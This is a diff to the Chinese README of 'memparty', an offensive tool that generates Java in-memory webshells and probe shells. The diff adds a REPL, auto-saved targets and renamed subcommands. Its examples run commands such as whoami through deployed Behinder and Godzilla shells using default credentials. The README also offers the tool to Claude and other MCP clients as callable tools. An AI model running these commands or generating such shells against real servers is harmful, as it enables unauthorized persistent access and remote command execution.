@@ -11,16 +11,18 @@
 
 - **交互式向导** —— 不带参数运行 `memparty gen`，从实时拉取的 API 菜单中选择
   服务器 / 工具 / 类型 / 打包器。
-- **完全可脚本化** —— 每个选项都有对应命令行参数，CI 或脚本中可以精确复现。
+- **完全可脚本化** —— 每个选项都有对应命令行参数，CI 或脚本中可以精确复现；
+  `--json` 模式下连错误都是结构化 JSON（`{"ok":false,"error":...}`）。
+- **REPL** —— 裸 `memparty` 进入交互循环，一次会话跑多个命令，目标名随存随用。
 - **MCP 服务器** —— `memparty mcp` 把生成和配置能力暴露为工具，供 Claude 及其他 MCP 客户端调用。
 - **覆盖全部端点** —— 内存马生成、探测马生成、配置查询、类名解析、版本查询。
 - **连接测试** —— `memparty connect` 验证已部署的 哥斯拉 / 冰蝎 / suo5 马是否存活、
   凭证是否正确（回显 / 握手双向校验）。
 - **命令执行** —— `memparty exec` 在已部署的哥斯拉 / 冰蝎马上执行命令并回显输出
   （真实 `execCommand` / `Cmd` payload 往返）。
-- **命名目标** —— `memparty target save` 把 shell 存进项目（支持备注 + 分类），之后
+- **命名目标** —— `memparty save` 把 shell 存进项目（支持备注 + 分类），之后
   `memparty exec web1/bh9060 --cmd "whoami"` 一个名字就够。
-- **操作日志** —— 每次 gen/probe/connect/exec/target 操作都追加到
+- **操作日志** —— 每次 gen/probe/connect/exec/save/note/remove 操作都追加到
   `~/.memparty/operations.jsonl`，`memparty log` 按分类和目标查询。
 - **灵活的输出** —— payload 默认输出到 stdout，`-o file` 写文件（`.class`/`.jar` 自动
   base64 解码）。
@@ -53,8 +55,22 @@ export MEMPARTY_API_URL=http://127.0.0.1:8080
 
 ### 交互模式
 
+裸 `memparty` 进入 REPL：一个进程里连续执行任意子命令，配合自动保存的命名目标，
+一次会话打通 生成 → 验证 → 执行：
+
+```text
+memparty> connect -u http://192.0.2.10/shell.jsp -t behinder --header-value my-secret-token
+saved as '192.0.2.10/behinder'
+memparty> exec 192.0.2.10/behinder --cmd whoami
+memparty> list
+memparty> exit
+```
+
+带参数运行时行为不变（管道 / CI 里裸 `memparty` 仍打印帮助）。REPL 内 `help` 查看命令、
+`<子命令> --help` 查看示例、`exit`/`quit` 退出。`gen` / `probe` 的交互向导在 REPL 里照常可用：
+
 ```bash
-memparty gen        # 内存马向导
+memparty gen        # 内存马向导（REPL 外）
 memparty probe      # 探测马向导
 ```
 
@@ -163,32 +179,35 @@ memparty exec -u http://target/shell.jsp -t behinder --pass rebeyond --cmd "cat 
 归组同一次任务的多台 shell，并可带 `--remark` 备注和 `--category` 分类。
 存储文件为 `~/.memparty/targets.json`。
 
+`connect` / `exec` 成功后会**自动保存**为 `<主机>/<工具>`（如 `192.0.2.10/behinder`，
+加 `--no-save` 跳过），下次直接报这个名字即可；也可以用 `save` 显式指定名字：
+
 ```bash
 # 保存（项目自动创建；--remark/--category 是项目级属性，
 # --shell-remark 是这台 shell 自己的备注）
-memparty target save web1/bh9060 -u http://192.0.2.10:9060/console/service \
+memparty save web1/bh9060 -u http://192.0.2.10:9060/console/service \
   -t behinder --pass rebeyond --header-name User-Agent --header-value my-secret-token \
   --remark "内网测试环境 WebSphere" --category test --shell-remark "root 权限"
 
 # 列出全部（可按 --category <名称> 过滤）
-memparty target list
+memparty list
 
 # 使用：<项目>/<shell>；项目里只有一个 shell 时光写项目名也行
 memparty connect web1/bh9060
 memparty exec web1 --cmd "whoami"
 
 # 改项目备注 / 改某台 shell 的备注 / 清理
-memparty target note web1 --remark "新备注" --category prod
-memparty target note web1/bh9060 --remark "新的 shell 备注"
-memparty target remove web1/bh9060   # 删单个 shell
-memparty target remove web1          # 删整个项目
+memparty note web1 --remark "新备注" --category prod
+memparty note web1/bh9060 --remark "新的 shell 备注"
+memparty remove web1/bh9060   # 删单个 shell
+memparty remove web1          # 删整个项目
 ```
 
 显式参数仍会覆盖已存值（如 `memparty exec web1 --cmd id --pass 其他密码`）。
 
 ### 操作日志
 
-每次操作（gen、probe、connect、exec、target save/note/remove）都以一行 JSON 追加到
+每次操作（gen、probe、connect、exec、save/note/remove）都以一行 JSON 追加到
 `~/.memparty/operations.jsonl` —— 记录目标、结果、耗时，exec 还记录命令和截断后的输出。
 凭证和 payload 内容不会写入日志。
 
